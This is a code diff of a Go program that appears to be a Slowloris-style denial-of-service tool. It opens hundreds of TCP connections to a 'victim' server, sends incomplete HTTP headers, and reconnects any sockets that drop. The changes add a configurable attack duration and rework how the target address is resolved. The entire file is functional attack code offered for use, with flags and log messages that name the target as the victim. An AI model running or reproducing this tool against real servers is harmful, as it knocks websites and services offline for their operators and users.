@@ -18,6 +18,7 @@ type attackParams struct {
 	connectionsNr *uint64
 	timeout       *uint64
 	agents        []string
+	duration      *uint64
 }
 
 type connection struct {
@@ -30,12 +31,17 @@ func main() {
 	attack := parseArguments()
 	quit := make(chan bool)
 	cons := int(*attack.connectionsNr)
+	host := attack.serverURL.Hostname()
+	port := attack.serverURL.Port()
+	endpoint, tcperr := net.ResolveTCPAddr("tcp", host+":"+port)
+	if tcperr != nil {
+		log.Fatalf("%v\n", tcperr)
+	}
 
 	for i := 1; i <= cons; i++ {
-		agent := getRandomAgent(attack.agents)
-		url := attack.serverURL
+		agent := attack.agents[rand.Intn(len(attack.agents))]
 
-		connection, err := createConnection(url, agent, i, quit)
+		connection, err := createConnection(endpoint, attack.serverURL.Path, agent, i, quit)
 		if err != nil {
 			switch err.Err.(type) {
 			case *os.SyscallError:
@@ -43,15 +49,14 @@ func main() {
 				// connection refuse from the server, socket opening problems
 				log.Println(err.Err)
 				log.Println("Starting a new monitoring routine")
-				go monitor(attack, "192.168.0.102:8080", i, quit)
+				go monitor(attack, endpoint, attack.serverURL.Path, i, quit)
 			case *net.DNSError:
 				// if we reached this case, then most
 				// probably the host does not exists
-				log.Println(err.Err)
-				return
+				log.Fatalln(err.Err)
 			default:
-				fmt.Println("Unknown error, terminating the program")
-				return
+				// should not reach here
+				log.Fatalln("Unknown error, terminating the program")
 			}
 
 			break
@@ -60,10 +65,10 @@ func main() {
 		}
 	}
 
-	time.Sleep(time.Second * 60)
+	time.Sleep(time.Second * time.Duration(*attack.duration))
 	close(quit)
 
-	log.Println("Stopping the program")
+	log.Println("Exiting the program")
 }
 
 // starts a new routine that continuously sends packets to the server
@@ -104,7 +109,7 @@ func (m *connection) start(timeout *uint64, quit chan bool) {
 }
 
 // tries to create as much tcp connections as possible
-func monitor(attack *attackParams, victim string, id int, quit chan bool) {
+func monitor(attack *attackParams, address *net.TCPAddr, path string, id int, quit chan bool) {
 	retry := time.Second * time.Duration(*attack.timeout)
 
 	for {
@@ -116,7 +121,7 @@ func monitor(attack *attackParams, victim string, id int, quit chan bool) {
 
 			log.Println("Trying to open a new socket from the monitor routine...")
 
-			connection, err := createConnection(attack.serverURL, getRandomAgent(attack.agents), id, quit)
+			connection, err := createConnection(address, path, attack.agents[rand.Intn(len(attack.agents))], id, quit)
 			if err != nil {
 				continue
 			}
@@ -127,20 +132,19 @@ func monitor(attack *attackParams, victim string, id int, quit chan bool) {
 	}
 }
 
-func createConnection(url *url.URL, agent string, id int, quit chan bool) (*connection, *net.OpError) {
+func createConnection(address *net.TCPAddr, path, agent string, id int, quit chan bool) (*connection, *net.OpError) {
 	payload := func() string {
-		var path string
-		if url.Path == "" {
-			path = "/"
+		var headerPath string
+		if path == "" {
+			headerPath = "/"
 		} else {
-			path = url.Path
+			headerPath = path
 		}
 
-		return fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent:%s\r\n", path, url.Host, agent)
+		return fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent:%s\r\n", headerPath, address.IP.String(), agent)
 	}()
 
-	// conn, err := net.Dial("tcp", "192.168.0.102:8080")
-	conn, err := net.Dial("tcp", "192.168.0.102:8080")
+	conn, err := net.DialTCP("tcp", nil, address)
 	if err != nil {
 		return nil, err.(*net.OpError)
 	}
@@ -148,21 +152,20 @@ func createConnection(url *url.URL, agent string, id int, quit chan bool) (*conn
 	return &connection{&payload, id, conn}, nil
 }
 
-func getRandomAgent(agents []string) string {
-	length := len(agents)
-
-	return agents[rand.Intn(length)]
-}
-
 func parseArguments() *attackParams {
-	server := flag.String("s", "http://192.168.0.102:8080", "The network address of the victim")
+	server := flag.String("s", "http://localhost:8080", "The network address of the victim")
 	connectionsNr := flag.Uint64("c", 350, "The number of connections to establish with the victims server")
 	timeout := flag.Uint64("t", 10, "The time between sending packets in every active connection (in seconds)")
 	agentsPath := flag.String("ap", "agents.txt", "The file name with different user agents")
+	duration := flag.Uint64("d", 10*60, "The duration of the attack (in seconds)")
 	flag.Parse()
 
+	if !strings.Contains(*server, "http://") && !strings.Contains(*server, "https://") {
+		s := fmt.Sprintf("http://%s", *server)
+		server = &s
+	}
+
 	victimURL, err := url.ParseRequestURI(*server)
-	fmt.Println(victimURL)
 	if err != nil {
 		log.Fatalln(err)
 	}
@@ -186,6 +189,7 @@ func parseArguments() *attackParams {
 		connectionsNr: connectionsNr,
 		timeout:       timeout,
 		agents:        userAgents,
+		duration:      duration,
 	}
 
 	return logSetup(&attack)
@@ -195,6 +199,7 @@ func logSetup(attack *attackParams) *attackParams {
 	log.Printf("Attack will be performed on [%s]\n", attack.serverURL.String())
 	log.Printf("Will try to establish [%d] connections to the server\n", *attack.connectionsNr)
 	log.Printf("The timeout between messages is [%d] seconds\n", *attack.timeout)
+	log.Printf("The attack will last for [%d] seconds\n", *attack.duration)
 
 	return attack
 }
